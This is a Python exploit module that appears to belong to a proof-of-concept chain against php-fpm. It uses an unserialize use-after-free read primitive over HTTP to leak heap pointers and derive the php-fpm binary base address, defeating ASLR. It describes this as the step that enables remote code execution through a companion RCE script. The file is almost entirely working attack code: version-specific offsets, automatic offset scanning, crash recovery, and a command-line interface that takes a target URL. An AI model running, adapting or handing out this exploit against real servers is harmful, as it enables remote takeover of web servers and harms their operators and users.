#!/usr/bin/env python3
# INDEX: write-free remote php-fpm binbase leak | fpm | needs unserialize-uaf transport
"""Write-free remote php-fpm BINBASE leak.

Capability: derive binbase (the php-fpm PIE base) with NO prior write, over
the CVE-2026-109619 unserialize-UAF read transport. fpm corruption RCE needs
binbase, but the arbitrary READ cannot bootstrap it (reading binbase needs a
fired write = circular), so this supplies it write-free.

CVE-2026-109619 (unserialize var_hash UAF), php-fpm SAPI. Uses the remote-RCE
unserialize-UAF transport (``heap_leak`` + ``isstring_read``) for the leak,
setting only its HOST/PORT/PATH.

Mechanism: the UAF's R: single-request leak yields a chunk-interior zend_reference
pointer H. The payload builds, as serialized element 0, a live zend_object at
a deterministic position in the request's 2 MB zend_mm chunk::

    chunk = H & ~0x1FFFFF              # zend_mm 2MB-aligned chunk base
    obj   = chunk + OBJ_CHUNK_OFF      # the element-0 zend_object

That object (and the HashTable before it) carry php-fpm image pointers at
fixed object-relative offsets, read with the forged IS_STRING read:

  * ``obj - 0x08`` = a HashTable ``pDestructor`` = ``&zval_ptr_dtor``
    (.text)           -> binbase = value - ZVAL_PTR_DTOR_OFF.
  * ``obj + 0x18`` = the object's ``handlers`` = ``&std_object_handlers``
    (.data.rel.ro)    -> binbase = value - STD_OBJ_HANDLERS_OFF.

Two independent image pointers -> two binbase derivations that must agree,
neither requiring any write.

OFFSETS (php:8.4.26-fpm, re-derive per build): symbol offsets from the php-fpm
.dynsym (not stripped on the official image): ``readelf -sW
/usr/local/sbin/php-fpm``. OBJ_CHUNK_OFF is a request-shape-dependent
allocation constant (the $_POST entries before unserialize() shift element 0
within the 2 MB chunk); leak_binbase() auto-derives it per run (KNOWN_OBJ_OFFSETS
then a fine band), accepting a candidate only when its binbase is 2 MB-aligned
and confirmed by the second image pointer OR a real ELF-header read at the base.
Gdb-confirmed and /proc cross-checked on php:8.4.26-fpm, 3/3 across ASLR
re-randomization.
"""

import argparse
import importlib.util
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
from common.zend_mm import chunk_base, CHUNK_MASK  # noqa: E402

# --- php:8.4.26-fpm build constants (re-derive per build) -------------------
OBJ_CHUNK_OFF = 0x5b230          # element-0 zend_object offset within the chunk
ZVAL_PTR_DTOR_OFF = 0x7038e0     # &zval_ptr_dtor      (readelf: zval_ptr_dtor)
STD_OBJ_HANDLERS_OFF = 0x15ff100  # &std_object_handlers (readelf: std_object_handlers)

# OBJ_CHUNK_OFF is REQUEST-SHAPE dependent: the $_POST entries PHP allocates
# before unserialize() runs shift the element-0 object within the 2 MB chunk, so
# a single hardcode cannot be right across sinks/hosts. These are the offsets
# derived so far on 8.4.26-fpm (verified against /proc); leak_binbase() below
# AUTO-DERIVES the right one per run, trying this map first, then a fine band:
#   0x5b1f8  echo sink (remote_app.php: one `cook` $_POST var) + gate.php shape
#   0x5b118  order.php SORT shape (field + 256 cand[])
#   0x5b230  the original gdb-measured spray shape (SPRAY_LEN=280/COUNT=32)
# The derivation self-validates: a candidate is accepted only when its image
# pointer yields a 2 MB-aligned binbase that EITHER agrees with the second image
# pointer (std_object_handlers) OR is confirmed by a real php-fpm ELF header read
# at the derived base. No hardcoded offset is trusted blindly.
KNOWN_OBJ_OFFSETS = (0x5b1f8, 0x5b118, 0x5b230)


def _load_remote_rce():
    """Import universal_remote_rce.py as the leak/read transport."""
    path = os.path.join(_POC_ROOT, "chains", "universal_remote_rce.py")
    spec = importlib.util.spec_from_file_location("universal_remote_rce", path)
    remote_rce = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(remote_rce)
    return remote_rce


def _read_qword_window(remote_rce, fake_addr, min_len, tries=8):
    """One forged-IS_STRING read at fake_addr; require slen>=min_len."""
    for _ in range(tries):
        r = remote_rce.isstring_read(fake_addr, timeout=4)
        if r is not None and r[0] >= min_len and len(r[1]) >= min_len:
            return r
    return None


def confirm_elf(remote_rce, binbase):
    """Independent, build-agnostic cross-check of a derived binbase: read the
    php-fpm ELF header at `binbase` via the forged read. Returns e_phnum (a
    small sane int) if `binbase` really is the php-fpm image base, else None.

    This is the second, offset-free agreement signal the auto-derive leans on
    when only ONE image pointer (zval_ptr_dtor) is cleanly readable at a given
    request shape (e.g. the echo-sink shape, where the object's handlers slot is
    not reachable with a sane length anchor). A \\x7fELF header with e_ehsize==64
    / e_phentsize==56 at the exact 2 MB-aligned candidate cannot arise by chance
    from a wrong image pointer, so it validates the derivation on its own."""
    try:
        return remote_rce._read_elf_header(binbase)
    except Exception:
        return None


def _image_ptrs_at(remote_rce, obj, read_handlers=True):
    """Read the element-0 object's image pointers. Returns (dtor, handlers),
    either may be None. dtor is read first via the reliable obj-0x20 anchor
    (len field at obj-0x10); handlers via obj-0x28 (len field at obj-0x18) and is
    skipped when read_handlers is False (its anchor is more crash-prone, and the
    auto path confirms binbase via the ELF header instead)."""
    dtor = handlers = None
    r = _read_qword_window(remote_rce, obj - 0x20, 8)
    if r is not None:
        dtor = struct.unpack_from("<Q", r[1], 0)[0]
    if read_handlers:
        r = _read_qword_window(remote_rce, obj - 0x28, 0x30)
        if r is not None and len(r[1]) >= 0x30:
            handlers = struct.unpack_from("<Q", r[1], 0x28)[0]
    return dtor, handlers


def _eval_obj(remote_rce, obj, read_handlers=True, want_elf_confirm=True, verbose=False):
    """Evaluate a candidate element-0 object address. Returns (binbase, detail)
    if it yields a 2 MB-aligned binbase confirmed by two-pointer agreement or an
    ELF-header read; else (None, detail). Never raises on a crashed read."""
    dtor, handlers = _image_ptrs_at(remote_rce, obj, read_handlers=read_handlers)
    cands = {}
    if dtor is not None:
        cands["zval_ptr_dtor"] = (dtor, dtor - ZVAL_PTR_DTOR_OFF)
    if handlers is not None:
        cands["std_object_handlers"] = (handlers, handlers - STD_OBJ_HANDLERS_OFF)
    good = {n: bb for n, (_, bb) in cands.items() if bb > 0 and (bb & CHUNK_MASK) == 0}
    detail = {"candidates": cands}
    if not good:
        return None, detail
    uniq = set(good.values())
    # strongest signal: two independent image pointers agree.
    if len(good) >= 2 and len(uniq) == 1:
        bb = next(iter(uniq))
        detail.update(binbase=bb, agree=2, confirm="two-pointer")
        return bb, detail
    # single aligned pointer -> confirm with an ELF header read at the base.
    for bb in uniq:
        if not want_elf_confirm:
            detail.update(binbase=bb, agree=1, confirm="none")
            return bb, detail
        epn = confirm_elf(remote_rce, bb)
        if epn is not None:
            detail.update(binbase=bb, agree=1, confirm=f"elf(phnum={epn})",
                          elf_phnum=epn)
            if verbose:
                print(f"    [confirm] ELF header at {bb:#x}: e_phnum={epn}")
            return bb, detail
    return None, detail


def _leak_chunk(remote_rce, leak_tries):
    """Leak one heap pointer H and mask to the 2 MB chunk base; (None, None)
    on failure."""
    H = None
    for _ in range(leak_tries):
        H = remote_rce.heap_leak()
        if H:
            break
    if not H:
        return None, None
    return H, chunk_base(H)


def derive_obj_off(remote_rce, chunk, leak_tries=12, offsets=None, fine_band=True,
                   verbose=True):
    """AUTO-DERIVE the element-0 object offset (and thus binbase) for the live
    request shape, without trusting any single hardcode. Tries `offsets` (the
    KNOWN_OBJ_OFFSETS map plus the module default by default), then a bounded
    8-byte fine band around them, accepting the first offset whose image pointer
    yields a 2 MB-aligned, self-validated binbase (see _eval_obj).

    Robust to forged-read crashes: on a crash the single fpm worker respawns but
    its image base (fork-shared) AND, on this host, the zend_mm chunk base stay
    put, so a crashed probe is simply re-leaked and retried. Returns
    (obj_off, binbase, detail) or (None, None, detail)."""
    if offsets is None:
        offsets = []
        for o in (OBJ_CHUNK_OFF,) + tuple(KNOWN_OBJ_OFFSETS):
            if o not in offsets:
                offsets.append(o)
    cand_offs = list(offsets)
    if fine_band:
        band = set(range(0x5b000, 0x5b300, 8))
        band |= set(range(min(offsets) - 0x100, max(offsets) + 0x108, 8))
        cand_offs += sorted(o for o in band if o not in offsets)
    detail = {"scanned": 0, "crashes": 0, "chunk": chunk}
    for off in cand_offs:
        obj = chunk + off
        detail["scanned"] += 1
        bb, ev = _eval_obj(remote_rce, obj, read_handlers=True, want_elf_confirm=True,
                           verbose=verbose)
        if bb is None and not ev.get("candidates"):
            # a crashed/empty read: worker may have respawned; re-leak the chunk
            # (image base + chunk are stable here) and retry this same offset.
            detail["crashes"] += 1
            H, newchunk = _leak_chunk(remote_rce, leak_tries)
            if newchunk is None:
                continue
            if newchunk != chunk:
                if verbose:
                    print(f"    [derive] chunk moved {chunk:#x}->{newchunk:#x} "
                          f"(binbase is image-based, unaffected)")
                chunk = newchunk
                detail["chunk"] = chunk
            obj = chunk + off
            bb, ev = _eval_obj(remote_rce, obj, read_handlers=True,
                               want_elf_confirm=True, verbose=verbose)
        if bb is not None:
            detail.update(obj_off=off, binbase=bb, eval=ev)
            if verbose:
                print(f"[+] auto-derived OBJ_CHUNK_OFF = {off:#x}  "
                      f"(binbase={bb:#x}, {ev['confirm']})")
            return off, bb, detail
    return None, None, detail


def _leak_binbase_classic(remote_rce, leak_tries=12, verbose=True):
    """Single-offset leak at the module OBJ_CHUNK_OFF (the fast path): tried
    first so a build whose hardcode already fits (e.g. 8.5.11 callers that set
    OBJ_CHUNK_OFF + their symbol offsets) resolves immediately. leak_binbase()
    falls through to the auto-derive only when this returns None."""
    detail = {}
    H = None
    for _ in range(leak_tries):
        H = remote_rce.heap_leak()
        if H:
            break
    if not H:
        return None, {"error": "heap_leak returned no pointer"}
    chunk = chunk_base(H)
    obj = chunk + OBJ_CHUNK_OFF
    detail.update(H=H, chunk=chunk, obj=obj)
    if verbose:
        print(f"[*] R: heap leak        H = {H:#x}")
        print(f"[*] zend_mm chunk base    = {chunk:#x}  (H & ~0x1FFFFF)")
        print(f"[*] element-0 object      = {obj:#x}  (chunk + {OBJ_CHUNK_OFF:#x})")

    cands = {}

    # image pointer #1: &zval_ptr_dtor at obj-0x08 (pDestructor of the preceding
    # HashTable). read window starts at obj-0x08 (= (obj-0x20)+0x18).
    r = _read_qword_window(remote_rce, obj - 0x20, 8)
    if r is not None:
        dtor = struct.unpack_from("<Q", r[1], 0)[0]
        bb = dtor - ZVAL_PTR_DTOR_OFF
        cands["zval_ptr_dtor"] = (dtor, bb)
        if verbose:
            print(f"[+] &zval_ptr_dtor  @obj-0x08 = {dtor:#x} -> binbase = {bb:#x}")

    # image pointer #2: &std_object_handlers at obj+0x18 (object handlers).
    # read window starts at obj-0x10 (= (obj-0x28)+0x18); handlers at off 0x28.
    r = _read_qword_window(remote_rce, obj - 0x28, 0x30)
    if r is not None and len(r[1]) >= 0x30:
        handlers = struct.unpack_from("<Q", r[1], 0x28)[0]
        bb = handlers - STD_OBJ_HANDLERS_OFF
        cands["std_object_handlers"] = (handlers, bb)
        if verbose:
            print(f"[+] &std_object_handlers@obj+0x18 = {handlers:#x} -> binbase = {bb:#x}")

    if not cands:
        return None, {**detail, "error": "no image pointer could be read"}

    bases = {name: bb for name, (_, bb) in cands.items()}
    # sanity: a PIE base is 2 MB aligned (ZEND_MM_CHUNK_SIZE) on this build.
    good = {n: b for n, b in bases.items() if b > 0 and (b & CHUNK_MASK) == 0}
    detail["candidates"] = cands
    if not good:
        return None, {**detail, "error": f"no sane (2MB-aligned) binbase: {bases}"}
    uniq = set(good.values())
    if len(uniq) > 1:
        return None, {**detail,
                      "error": f"image pointers disagree: "
                               f"{{{', '.join(f'{n}={b:#x}' for n,b in good.items())}}}"}
    binbase = uniq.pop()
    detail["binbase"] = binbase
    detail["agree"] = len(good)
    return binbase, detail


def leak_binbase(remote_rce, leak_tries=12, verbose=True, obj_off=None, auto=True):
    """Return (binbase, detail) or (None, detail).

      * obj_off=<int>  -- force a specific element-0 object offset (validated by
        two-pointer agreement or an ELF-header read); no scan.
      * default        -- try the module OBJ_CHUNK_OFF first (fast win on a build
        whose hardcode already fits), and only if that fails AUTO-DERIVE the
        offset for the live request shape (derive_obj_off: KNOWN_OBJ_OFFSETS
        map, then a bounded fine band, each self-validated). auto=False disables
        the derive.

    Callers that pass nothing get the classic offset when it works and the
    auto-derive only as a fallback when the hardcode is miscalibrated (e.g. an
    echo-sink shape)."""
    if obj_off is not None:
        H, chunk = _leak_chunk(remote_rce, leak_tries)
        if chunk is None:
            return None, {"error": "heap_leak returned no pointer"}
        obj = chunk + obj_off
        if verbose:
            print(f"[*] forced OBJ_CHUNK_OFF={obj_off:#x} "
                  f"chunk={chunk:#x} obj={obj:#x}")
        bb, ev = _eval_obj(remote_rce, obj, read_handlers=True, want_elf_confirm=True,
                           verbose=verbose)
        if bb is None:
            return None, {"chunk": chunk, "obj": obj, "obj_off": obj_off,
                          "error": "forced offset did not validate", "eval": ev}
        return bb, {"chunk": chunk, "obj": obj, "obj_off": obj_off,
                    "agree": ev.get("agree"), "confirm": ev.get("confirm"),
                    "binbase": bb, "candidates": ev.get("candidates")}

    # 1) classic single-offset path -- fast win on a fitting build.
    bb, detail = _leak_binbase_classic(remote_rce, leak_tries=leak_tries, verbose=verbose)
    if bb is not None:
        detail.setdefault("obj_off", OBJ_CHUNK_OFF)
        detail.setdefault("lane", "classic")
        return bb, detail
    if not auto:
        return bb, detail

    # 2) auto-derive the shape-specific offset.
    if verbose:
        print(f"[*] classic OBJ_CHUNK_OFF={OBJ_CHUNK_OFF:#x} miscalibrated "
              f"({detail.get('error', 'no validated image pointer')}); "
              f"auto-deriving ...")
    H, chunk = _leak_chunk(remote_rce, leak_tries)
    if chunk is None:
        return None, {"error": "heap_leak returned no pointer (auto)"}
    off, bb, ddet = derive_obj_off(remote_rce, chunk, leak_tries=leak_tries,
                                   verbose=verbose)
    if bb is None:
        return None, {**ddet, "lane": "auto",
                      "error": "auto-derive found no validated object offset"}
    ev = ddet.get("eval", {})
    return bb, {"chunk": ddet.get("chunk", chunk),
                "obj": ddet.get("chunk", chunk) + off, "obj_off": off,
                "binbase": bb, "agree": ev.get("agree"),
                "confirm": ev.get("confirm"), "candidates": ev.get("candidates"),
                "lane": "auto", "scanned": ddet.get("scanned"),
                "crashes": ddet.get("crashes")}


def leak_binbase_oneread(remote_rce, chunk=None, leak_tries=12, verbose=True):
    """FALLBACK LANE: derive binbase from ONE wide forged-IS_STRING window,
    optionally without heap_leak().

    The primary ``leak_binbase`` above does two things the main pipeline relies
    on: it masks ``heap_leak()``'s single-qword pointer H for the chunk base
    (free), then spends a SEPARATE forged read per image pointer. That is the
    right trade when H is available.

    This lane handles the case where VABISMO's single-window geometry is the
    better fit: ``heap_leak()`` is unavailable (its
    bucket-overwrite recovery doesn't reflect on this target) but a wide
    forged-IS_STRING read still works. It differs from the primary path two ways:

    1. One read, both image pointers. ``&zval_ptr_dtor`` (obj-0x08) and
       ``&std_object_handlers`` (obj+0x18) are only 0x20 apart, so a single
       ``isstring_read(obj-0x28)`` window (data begins at obj-0x10) carries BOTH:
       dtor at data[0x08], handlers at data[0x28]. This reuses the exact length
       field (obj-0x18, slen>=0x30) the primary path's handlers read already
       requires - so wherever the two-read path works, this single read works.
       No new offsets, VABISMO-style dual-extract from one echoed string.

    2. heap_leak-independent anchor. The chunk base is taken from ``chunk=`` when
       supplied (from a VABISMO-style groom leak, a coarse spray, or a prior
       run - the php-fpm chunk/PIE are stable for the master's lifetime), and
       only falls back to ``heap_leak()`` if no chunk is given. So the lane can
       run with heap_leak fully down, given a chunk hint from elsewhere.

    Returns (binbase, detail) or (None, detail). detail['reads'] == 1 on success.
    """
    detail = {"reads": 1, "lane": "oneread"}
    if chunk is None:
        H = None
        for _ in range(leak_tries):
            H = remote_rce.heap_leak()
            if H:
                break
        if not H:
            return None, {**detail,
                          "error": "no chunk supplied and heap_leak returned "
                                   "no pointer (pass chunk= from an alternate "
                                   "leak to run this lane heap_leak-free)"}
        chunk = chunk_base(H)
        detail["H"] = H
        detail["chunk_src"] = "heap_leak"
    else:
        chunk = chunk_base(chunk)     # tolerate an interior ptr as the hint
        detail["chunk_src"] = "supplied"
    obj = chunk + OBJ_CHUNK_OFF
    detail.update(chunk=chunk, obj=obj)
    if verbose:
        print(f"[*] chunk base ({detail['chunk_src']}) = {chunk:#x}")
        print(f"[*] element-0 object            = {obj:#x}  (chunk + {OBJ_CHUNK_OFF:#x})")

    # ONE wide window at obj-0x28: data starts at obj-0x10, covers both image
    # pointers. slen>=0x30 to reach handlers at data[0x28].
    r = _read_qword_window(remote_rce, obj - 0x28, 0x30)
    if r is None or len(r[1]) < 0x30:
        return None, {**detail, "error": "single-window read too short / failed"}
    data = r[1]
    dtor = struct.unpack_from("<Q", data, 0x08)[0]       # obj-0x08
    handlers = struct.unpack_from("<Q", data, 0x28)[0]   # obj+0x18
    cands = {
        "zval_ptr_dtor": (dtor, dtor - ZVAL_PTR_DTOR_OFF),
        "std_object_handlers": (handlers, handlers - STD_OBJ_HANDLERS_OFF),
    }
    if verbose:
        print(f"[+] &zval_ptr_dtor      @obj-0x08 = {dtor:#x} -> binbase = {cands['zval_ptr_dtor'][1]:#x}")
        print(f"[+] &std_object_handlers@obj+0x18 = {handlers:#x} -> binbase = {cands['std_object_handlers'][1]:#x}")
    detail["candidates"] = cands

    bases = {n: bb for n, (_, bb) in cands.items()}
    good = {n: b for n, b in bases.items() if b > 0 and (b & CHUNK_MASK) == 0}
    if not good:
        return None, {**detail, "error": f"no sane (2MB-aligned) binbase: {bases}"}
    uniq = set(good.values())
    if len(uniq) > 1:
        return None, {**detail,
                      "error": "image pointers disagree: "
                               f"{{{', '.join(f'{n}={b:#x}' for n,b in good.items())}}}"}
    binbase = uniq.pop()
    detail["binbase"] = binbase
    detail["agree"] = len(good)
    return binbase, detail


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="write-free remote php-fpm binbase leak (CVE-2026-109619)")
    ap.add_argument("url", nargs="?", default="http://127.0.0.1:8210/remote_app.php",
                    help="target sink URL (unserialize()+echo-serialize), "
                         "default http://127.0.0.1:8210/remote_app.php")
    ap.add_argument("--tries", type=int, default=12,
                    help="heap_leak attempts (default 12)")
    ap.add_argument("--oneread", action="store_true",
                    help="fallback lane: derive binbase from ONE wide window "
                         "(both image pointers in one read); use with --chunk "
                         "to run without heap_leak")
    ap.add_argument("--chunk", default=None,
                    help="zend_mm chunk base (hex) for the --oneread lane when "
                         "heap_leak is unavailable; an interior ptr is masked")
    args = ap.parse_args(argv)

    from urllib.parse import urlsplit
    u = urlsplit(args.url if "://" in args.url else "http://" + args.url)
    remote_rce = _load_remote_rce()
    remote_rce.HOST = u.hostname
    remote_rce.PORT = u.port or 80
    remote_rce.PATH = u.path or "/remote_app.php"
    print(f"[*] target {remote_rce.HOST}:{remote_rce.PORT}{remote_rce.PATH}")

    if args.oneread or args.chunk is not None:
        chunk = int(args.chunk, 16) if args.chunk is not None else None
        binbase, detail = leak_binbase_oneread(remote_rce, chunk=chunk, leak_tries=args.tries)
    else:
        binbase, detail = leak_binbase(remote_rce, leak_tries=args.tries)
    if binbase is None:
        print(f"[-] FAILED: {detail.get('error')}")
        return 2
    lane = detail.get("lane", "primary")
    confirm = detail.get("confirm") or f"{detail.get('agree', 1)} image ptr(s)"
    print(f"[+] php-fpm BINBASE = {binbase:#x}")
    print(f"    lane={lane}  OBJ_CHUNK_OFF={detail.get('obj_off', OBJ_CHUNK_OFF):#x}"
          f"  confirm={confirm}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
